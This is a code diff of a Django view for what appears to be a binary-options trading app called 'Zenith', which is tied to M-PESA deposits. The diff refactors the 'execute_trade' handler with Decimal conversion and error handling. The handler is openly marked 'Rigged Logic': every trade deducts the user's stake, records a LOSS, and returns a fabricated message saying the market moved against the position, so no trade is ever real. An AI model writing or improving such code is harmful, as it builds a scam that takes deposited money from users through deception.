@@ -1,3 +1,4 @@
+from decimal import Decimal
 import json
 import requests
 from datetime import datetime
@@ -43,26 +44,35 @@ def api_logout(request):
 @login_required
 def execute_trade(request):
     if request.method == 'POST':
-        data = json.loads(request.body)
-        amount = float(data.get('amount', 0))
-        t_type = data.get('type') # CALL or PUT
+        try:
+            data = json.loads(request.body)
+            
+            # Safely convert the incoming amount to a Decimal
+            amount_val = data.get('amount', 0)
+            amount = Decimal(str(amount_val)) 
+            t_type = data.get('type') # CALL or PUT
+            
+            profile = request.user.zenithprofile
+            
+            if profile.balance < amount:
+                return JsonResponse({'success': False, 'message': 'Insufficient Balance. Please deposit.'})
+
+            # Rigged Logic: Deduct balance successfully
+            profile.balance -= amount
+            profile.save()
+
+            # Record the lost trade
+            ZenithTrade.objects.create(user=request.user, amount=amount, trade_type=t_type, outcome="LOSS")
+
+            return JsonResponse({
+                'success': True,
+                'new_balance': float(profile.balance), # Send back as float for JS to read
+                'message': f'Trade Expired OTM (Loss). Market spiked against your {t_type} position.'
+            })
+        except Exception as e:
+            # If anything fails, return a proper error message instead of crashing
+            return JsonResponse({'success': False, 'message': str(e)}, status=500)
         
-        profile = request.user.zenithprofile
-        if profile.balance < amount:
-            return JsonResponse({'success': False, 'message': 'Insufficient Balance. Please deposit.'})
-
-        # Rigged Logic: Deduct balance
-        profile.balance -= amount
-        profile.save()
-
-        ZenithTrade.objects.create(user=request.user, amount=amount, trade_type=t_type, outcome="LOSS")
-
-        return JsonResponse({
-            'success': True,
-            'new_balance': float(profile.balance),
-            'message': f'Trade Expired OTM (Loss). Market spiked against your {t_type} position.'
-        })
-
 # --- M-PESA LOGIC ---
 def trigger_stk_push(phone_number, amount, account_ref):
     if phone_number.startswith('+'): phone_number = phone_number[1:]
